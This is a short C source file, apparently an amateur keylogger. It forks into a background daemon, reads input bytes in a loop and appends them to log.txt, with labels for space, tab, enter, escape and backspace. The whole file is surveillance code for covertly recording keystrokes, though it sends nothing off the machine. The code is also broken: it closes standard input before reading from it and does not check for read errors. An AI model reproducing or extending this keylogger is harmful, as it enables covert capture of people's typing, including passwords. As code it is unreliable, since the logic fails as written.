#include <stdio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>

void create_daemon() {
    pid_t pid, sid;

    // Fork off the parent process
    pid = fork();

    // An error occurred
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    // If we got a good PID, then we can exit the parent process
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Change the file mode mask
    umask(0);

    // Create a new SID for the child process
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }

    // Change the current working directory
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

int main(int argc, char *argv[]) {
    int perm = S_IRWXU;
    int fd = open("log.txt", O_WRONLY | O_CREAT | O_APPEND, perm);

    if (fd == -1) {
        perror("Error opening file");
        return 1;
    }

    char bffr[100];
    int br, bw;
    
    create_daemon();
//   while(1)
    
    while (1) {
        br = read(STDIN_FILENO, bffr, sizeof(bffr));

//        bw = write(fd, bffr, br);
	
	// Check for specific keystrokes
        if (bffr[0] == ' ') {
            // Space key
            bw = write(fd, "[SPACE]", 7);
        } else if (bffr[0] == '\t') {
            // Tab key
            bw = write(fd, "[TAB]", 5);
        } else if (bffr[0] == '\n') {
            // Enter key
            bw = write(fd, "[ENTER]", 7);
        } else if (bffr[0] == 27) {
            // Escape key
            bw = write(fd, "[ESC]", 5);
            break; // Exit the loop on ESC key
        } else if (bffr[0] == 127) {
            // Backspace key
            bw = write(fd, "[BACKSPACE]", 11);
        } else {
            // Write other characters as they are
            bw = write(fd, bffr, br);
        }

        if (bw == -1) {
            perror("Error writing to file");
            break;
        }
    }

    close(fd);

    return 0;
}

